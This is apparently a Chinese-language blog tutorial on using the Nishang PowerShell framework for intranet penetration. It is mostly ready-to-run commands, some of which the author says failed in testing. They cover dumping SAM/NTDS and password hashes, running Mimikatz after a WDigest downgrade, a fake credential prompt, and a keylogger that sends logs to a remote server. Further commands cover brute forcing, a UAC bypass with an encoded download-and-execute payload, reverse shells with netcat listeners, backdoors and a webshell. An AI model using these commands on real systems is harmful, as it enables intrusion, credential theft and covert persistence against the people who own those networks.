<p>1,今天先来聊聊第一款powershell工具[其实把它称为powershell渗透框架似乎更合适些],nishang[想必早已家喻户晓],关于nishang中的每个ps脚本的选项用法,在代码的最前面都已有详细说明,请务必仔细阅读,因为系统默认是禁止执行ps脚本的,所以后面都会带上bypass选项<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted  如果你得到的是一个交互式的ps的shell,你也可以用该命令来放开脚本执行限制</div><div class="line"><span class="comment"># powershell –exec bypass –Command "Get-Host | Select-Object Version"  查看当前powershell版本,有些脚本需要在脚本的powershell版本中执行</span></div></pre></td></tr></table></figure></p>
<p>2,首先,所有内网渗透的第一步,信息搜集[Gather]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">检查当前机器是否为虚拟机:</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Check-VM.ps1';Check-VM&#125;"</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ps vmcheck.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">搜集当前机器的各种敏感信息,包括当前系统所登陆过的用户,putty连接过的机器,保存的ssh会话以及最近使用过的命令,当前机器所开启的共享,环境变量配置,系统平台操作系统位数,当前系统的用户及组信息,snmp配置,系统都安装了哪些软件,当前机器所处的域,hosts文件配置,正在运行的服务,本机的账号密码策略,无线网卡信息:</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-Information.ps1';Get-Information | Out-File machine_info.txt&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps machine_info.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">转储本地的sam文件[其实也是利用Volume Shadow Copy],如果是域控就转储ntds.dit和system.hiv[但实际测试中并未导出,代码很简单,也没看出问题在哪里],ntds.dit默认在<span class="symbol">C:</span>\Windows\system32\ntds.dit,如果ntds.dit不是在默认路径下,可以用-ntdsSource选项指明ntds.dit的位置,注意转储到的目录一定要能写,如果是本机还好,如果域内不建议这么导[尤其是用户量比较大时],而且实际测试过程中,这个转储出来的hash貌似并不太靠谱[难道是我的操作有误]</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Copy-VSS.ps1';Copy-VSS -DestinationDir c:\&#125;"   这里我直接让它放到C盘根下,实际中你可以指定你自己想存放的位置</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps copy vsso.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">扫描内网指定机器[可以内网的其它机器]所开放的端口,它是根据你所给的端口一个个的遍历,速度可能会有点儿慢[有点儿在<span class="string">'telnet'</span>的感觉]:</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\FireBuster.ps1';FireBuster 192.168.3.13 20-110 -Verbose&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps firebuster.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">从HKLM中提取lsa证书秘钥,注意需要system权限且要powershell以<span class="number">32</span>位模式运行,实际测试测试中,貌似管理权限还不够[没成功],不过类似的功能我们在实际渗透中我们完全可以用别的工具替代:</div><div class="line"><span class="comment"># C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-LSASecret.ps1';Enable-DuplicateToken;Get-LSASecret&#125;"</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取本地用户的密码hash,管理员或者system权限肯定是要有的,记得要把你的cmd调宽一点,要不然看不到完整结果,不过hash貌似又不对:</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-PassHashes.ps1';Get-PassHashes -PSObjectFormat | Out-File hash.txt&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps gethashes.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">获取本地用户的密码提示:</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-PassHints.ps1';Get-PassHints&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps getpashhhints.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">从windows Vault[至于这是个什么东西,请自行谷歌,其实就是各类证书管理器]中获取各种web密码,该脚本要求在powershell <span class="number">3.0</span>(win8以后的系统)以上执行,同时务必具备管理员以上权限,但本地实际测试中并未成功读出来:</div><div class="line"><span class="comment"># Powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-WebCredentials.ps1';Get-WebCredentials&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps webcredentials.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取当前机器的无线密码[前提是当前系统中要有正在使用的无线网卡才行,不过,这种方式对个人机来说还是挺有用价值的]:</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-WLAN-Keys.ps1';Get-WLAN-Keys&#125;"</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">简单的一些钓鱼模块,脚本执行以后它会一直弹出输入框,直到用户输入了正确的系统账号密码它才会自动退出,最后会把刚刚用户输入的账号密码显示出来,当然啦,你一样可以把它直接存到文件中</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-CredentialsPhish.ps1';Invoke-CredentialsPhish&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps credentialsphish.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">powershell版的mimiktaz,关于mimikatz的用法,相必大家都早已非常熟练,这里就不废话了:</div><div class="line"><span class="comment"># reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1  2012加上这个还是有点儿问题</span></div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-Mimikatz.ps1';Invoke-Mimikatz&#125;" 尝试直接抓取当前系统用户的明文密码</span></div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-Mimikatz.ps1';Invoke-Mimikatz -Command 'privilege::debug sekurlsa::wdigest exit'&#125;" 执行自定义mimikatz内置指令</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps mimikatz.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">强制登出系统中用户,然后截获其登陆的明文密码,有点儿劫持winlogon.exe进程的意思,但实际中折腾多都并未成功,如果有谁成功了,告诉小弟一声到底是哪里除了问题可好啊,嘿嘿……我比较懒,懒的看代码:</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-MimikatzWDigestDowngrade.ps1';Invoke-MimikatzWDigestDowngrade&#125;" 强制锁定系统,然后强迫用户重新登陆</span></div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-MimikatzWDigestDowngrade.ps1';Get-Job | Receive-Job&#125;" </span></div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-MimikatzWDigestDowngrade.ps1';Invoke-MimikatzWDigestDowngrade -RDP&#125;"</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">利用ReadProcessMemory()函数从内存中提取敏感数据,主要用来抓取内存中的各种网站登陆密码,测试过程中有时会卡死,拖慢系统,最重要的是,并抓不到什么东西:</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-Mimikittenz.ps1';Invoke-mimikittenz&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps Mimikittenz.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">利用无线的ssid提取用户凭据,看作者的介绍似乎非常实用[可能境外特殊的环境所致吧],原理暂时还没弄太明白,正在仔细学习中,后续会把模块单独拿出来说明</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-SSIDExfil.ps1';Invoke-SSIDExfil&#125;"</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">键盘记录,实际测试中还有些问题,正在看……</div><div class="line">PS <span class="symbol">C:</span>\nishang\Gather&gt; .\Keylogger.ps1 -CheckURL <span class="symbol">http:</span>/<span class="regexp">/http:/</span><span class="regexp">/192.168.3.23/drupal</span>-<span class="number">7.54</span> -MagicString pass 检查所给的网页中是否包含自己所给的关键字[admin],如果有就停止记录,记录会被保存在当前用户的temp目录下的key.log文件中, </div><div class="line">PS &gt; .\Keylogger.ps1 -CheckURL <span class="symbol">http:</span>/<span class="regexp">/http:/</span><span class="regexp">/192.168.3.23/drupal</span>-<span class="number">7.54</span> -MagicString pass -exfil -ExfilOption WebServer -URL <span class="symbol">http:</span>/<span class="regexp">/192.168.3.251/res</span>.php  直接把记录结果发到远程服务器,用POST接收下即可</div><div class="line">PS &gt; .\Keylogger.ps1 -persist 持续记录</div><div class="line">PS <span class="symbol">C:</span>\nishang\Gather&gt;  Parse_Keys .\key.log .\plains.txt  就可以还原记录内容了</div></pre></td></tr></table></figure>
<p>5,内网端口扫描及服务爆破[scan][目前只支持mssql,ftp,web,activedirectory爆破]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">首先,来看端口扫描,可以直接把要扫的端口都事先写在代码里面,不用非要手工指定,麻烦,fuck,又显示不全,实际中也并不建议一下子扫很多,比如你想找sa,只需要指定<span class="number">1433</span>即可,搞定了以后把hash抓一下,也许这事儿就成了,没必要一直扫,还容易报警</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Scan\Invoke-PortScan.ps1';Invoke-PortScan -StartAddress 192.168.3.1 -EndAddress 192.168.3.150 -ScanPort -port 21,22,443,445,3306,3389,1433&#125;"</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ps portscan.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">服务爆破,目前貌似只支持mssql,ftp,域[ActiveDirectory]和web</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Scan\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service SQL -Verbose&#125;"  爆破mssql的sa</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps bruteforce.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Scan\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service FTP -Verbose&#125;"  爆破ftp</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps bruteforce ftp.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Scan\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service ActiveDirectory -Verbose&#125;"  爆破域内指定账户密码</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps bruteforce dc.jpg" alt=""><br></p>
<p>6,提权相关[Escalation]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">窃取令牌</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Escalation\Enable-DuplicateToken.ps1';Enable-DuplicateToken&#125;"</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">尝试bypassUAC,并弹回一个高权限的meterpreter的shell[dll可自定义],可指定不同的bypass方法,更多方法请自行参考脚本说明,这里的payload我是直接用msf生成的,为了避免单双引号的问题,记得把它编码下,实际测试中貌似并没有成功,是我编码的问题吗</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Escalation\Invoke-PsUACme.ps1';Invoke-PsUACme -method oobe -Payload 'powershell -windowstyle hidden -e cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJAB3AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAHcALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAB3AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAHcALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADMALgA2ADoAOAAwADgAMAAvAGMAaAAxAFEAVgBEAGUAWAAnACkAOwAKAA=='&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps psuacme.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">卸载目标系统中指定的补丁,比如,可以尝试卸载一两个可直接用于提权的补丁,情不得已的情况下,我们也许还可以通过这种方式来快速拿回机器权限</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Escalation\Remove-Update.ps1';Remove-Update KB976902&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps remove update.jpg" alt=""><br></p>
<p>7,各种执行系统指令的方式,其实挺实用的,但我自己没成功,遗憾[Execution]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">利用powershell以文本的格式下载可执行文件,然后再自动转换成可执行格式并执行,下载者? 测了很多次都没成功,不太明白它的意思是直接提供一个可执行文件还是shellcode?</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Execution\Download_Execute.ps1';Download_Execute http://192.168.3.122/shell.txt&#125;"</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">下载并执行指定ps脚本</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Execution\Download-Execute-PS.ps1';Download-Execute-PS http://192.168.3.122/psshell.ps1  -nodownload&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps download_exec ps.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">利用sa在内网中快速提权种马,这个可能需要交互,连接成功后你可以选择要返回一个什么样的shell,跟sqltools很像[自己用的比较少],基本都是靠这个小脚本,方便,灵活,隐蔽,稳定,小巧,绝逼好用</div><div class="line">PS <span class="symbol">C:</span>\&gt; Set-ExecutionPolicy Unrestricted</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Execution\Execute-Command-MSSQL.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Execute-Command-MSSQL -ComputerName <span class="number">2012</span>R2DC -UserName sa -Password admin  实际渗透中可以用ip代替机器名</div></pre></td></tr></table></figure>
<p><img src="/img/ps mssql connect.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">利用dns txt 执行shellcode,有些还不是很通透,正在努力学习中……</div><div class="line">Execute-DNSTXT-Code.ps1</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">利用rundll32执行各种payload和系统指令以及bypass AppLocker,多次测试均未果,是不是想起了什么呢,没错jsrat呢,嘿嘿……</div><div class="line"><span class="comment"># nc -lvp 443 -u</span></div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Execution\Out-RundllCommand.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Out-RundllCommand -PayloadURL <span class="symbol">http:</span>/<span class="regexp">/192.168.3.251/</span>Invoke-PowerShellUdp.ps1 -Arguments <span class="string">"Invoke-PowerShellUdp -Reverse -IPAddress 192.168.3.251 -Port 53"</span></div></pre></td></tr></table></figure>
<p>8,所支持的一些shell种类,至于是不是真正走的某种协议,自己拿wireshark看下就知道,篇幅原因,我就不扯的太多[Shells]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">通过 regsvr32.exe 弹shell,脚本执行完以后会生成payload代码,然后把该代码拿到目标机器上去执行即可得到一个反向shell,实际测试未通过</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-JSRatRegsvr.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-JSRatRegsrv -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -Port <span class="number">808</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">通过 rundll32.exe 弹shell,依然未成功</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-JSRatRundll.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-JSRatRundll -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -Port <span class="number">808</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">通过http弹shell,可以看到成功以后它会弹回一个ps的shell</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-PoshRatHttp.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-PoshRatHttp -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -Port <span class="number">808</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps poshrathttp res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">通过https弹shell,加密shell,看样子数据是接到了,但shell没弹回来</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-PoshRatHttps.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-PoshRatHttps -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -Port <span class="number">8443</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">通过icmp弹shell,能ping的情况下可以尝试</div><div class="line"><span class="comment"># sysctl -w net.ipv4.icmp_echo_ignore_all=1</span></div><div class="line"><span class="comment"># python icmpsh_m.py 192.168.3.23 192.168.3.1</span></div><div class="line">PS &gt; Invoke-PowerShellIcmp -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">普通的tcp shell,有一点点错误,不过无伤大雅</div><div class="line">本地机器执行:</div><div class="line"><span class="symbol">C:</span>\&gt;nc -lvp <span class="number">1234</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps tcp shell.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">远程机器执行:</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-PowerShellTcp.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192.168</span>.<span class="number">3.251</span> -Port <span class="number">1234</span></div></pre></td></tr></table></figure>
<p><img src="/img/ps tcp shell res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">通过udp弹shell,不知为何数据容易塞住</div><div class="line">本地机器执行:</div><div class="line"><span class="symbol">C:</span>\&gt;nc -lvp <span class="number">53</span> -u</div></pre></td></tr></table></figure>
<p><img src="/img/ps udp shell.jpg" alt=""><br><br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">远程机器执行:</div><div class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Import</span>-<span class="keyword">Module</span> <span class="keyword">C</span>:\nishang\Shells\Invoke-PowerShellUdp.ps1</div><div class="line">PS <span class="keyword">C</span>:\&gt; Invoke-PowerShellUdp -<span class="keyword">Reverse</span> -IPAddress <span class="number">192.168</span><span class="number">.3</span><span class="number">.251</span> -Port <span class="number">53</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ps udp shell res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">通过wmi shell 其实你可以把它当成psexec的<span class="string">'powershell'</span>版,非常实用,它支持不同的shell类型,可根据自己的实际需求选择</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-PowerShellWmi.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-PowerShellWmi -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -UserName rootkit\administrator -ShellType Cmd</div></pre></td></tr></table></figure>
<p><img src="/img/ps wmic shell.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">通过gmail向目标机器发送控制指令,会不会想起gcat呢,嘿嘿……我们知道它是通过gmail来转储一堆json数据的,其实这俩脚本做的事情跟那个一样,因为不太稳定,实用性也不是非常大,这里就不详细说了,虽然邮箱密码不是我们的,但也不能太那啥……</div><div class="line">Invoke-PsGcat.ps1 	向gmail发送数据</div><div class="line">Invoke-PsGcatAgent.ps1 	从gmail上取刚才发的数据</div></pre></td></tr></table></figure>
<p>9,内网跳板,比较实用[Pivot]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Create-MultipleSessions.ps1[根据提供的口令批量检查内网的其它机器是否同样可用],本来是可以配合Run-EXEonRemote.ps1批量远程执行的,但实际测试中一直未成功,不过没关系,我们可以在检查完口令以后,再通过wce/mimikatz配合winexec的方式,批量种马也是一样的</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Pivot\Create-MultipleSessions.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Create-MultipleSessions -filename <span class="symbol">C:</span>\hostname.txt -Creds    这儿会提示你输入账号密码,然后它会拿着这个账号到你hostname中指定的机器名上去挨个尝试</div></pre></td></tr></table></figure></p>
<p><img src="/img/create-multipleseessions.png" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Invoke-NetworkRelay.ps1  其实就是转发,它同样也是利用netsh的方式进行转发的,关于更详细的利用netsh进行内网转发的,可以直接去看相关文章,这里就不再重复了</div><div class="line">Invoke-NetworkRelay -Relay v4tov4 -ListenAddress <span class="number">192.168</span>.<span class="number">3.251</span> -Listenport <span class="number">3389</span> -ConnectAddress <span class="number">192.168</span>.<span class="number">3.23</span>  -ConnectPort <span class="number">3387</span> -ComputerName <span class="number">192.168</span>.<span class="number">3.251</span> 把<span class="number">23</span>的<span class="number">3387</span>转到<span class="number">251</span>的<span class="number">3389</span></div></pre></td></tr></table></figure>
<p>10,留后门,比较简单,这里就不一一演示了[Backdoors]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Add-RegBackdoor.ps1 	劫持sethc.exe和utilman.exe,其实,就是古老的shift后门</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Backdoors\Add-RegBackdoor.ps1</div></pre></td></tr></table></figure></p>
<p><img src="/img/Add-RegBackdoor.png" alt=""><br><br><img src="/img/Add-RegBackdoor res.png" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Add-ScrnSaveBackdoor.ps1   	通过屏保执行指令</div><div class="line">DNS_TXT_Pwnage.ps1   		dns后门,当然啦,你需要个dns服务器</div><div class="line">Execute-OnTime.ps1  	 	定时下载并执行ps 的payload,记得,加上persist选项就可以实现自启动了</div><div class="line">Gupt-Backdoor.ps1   	 	这绝对是个吊炸天的想法,挺佩服做着的脑洞的,赞,通过ssid来执行后门,后期会把这个和上面那个模块再单独拿出来说明</div><div class="line">HTTP-Backdoor.ps1   		就是个普通的ps版的下载者</div><div class="line">Invoke-ADSBackdoor.ps1  	配合meterpreter注入shellcode实现持久控制</div></pre></td></tr></table></figure>
<p>11,ps版的webshell,免杀效果不错,能满足常用的上传下载命以及令执行[Antak-WebShell],记得改下账号密码即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">antak.aspx  aspx的webshell</div></pre></td></tr></table></figure></p>
<p>12,下面是一些比较粗糙的钓鱼模块,关于office系列的就不说了吧,因为都要启用宏,比较鸡肋,成功率相对比较高的就下面这些了,自带的信内容肯定是不合适的,如果真想发信,自己根据实际需求改一下就好了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Out-CHM.ps1    </div><div class="line">Out-HTA.ps1</div><div class="line">Out-Java.ps1</div><div class="line">Out-JS.ps1</div><div class="line">Out-SCF.ps1</div><div class="line">Out-SCT.ps1</div><div class="line">Out-Shortcut.ps1</div><div class="line">Out-WebQuery.ps1</div></pre></td></tr></table></figure></p>
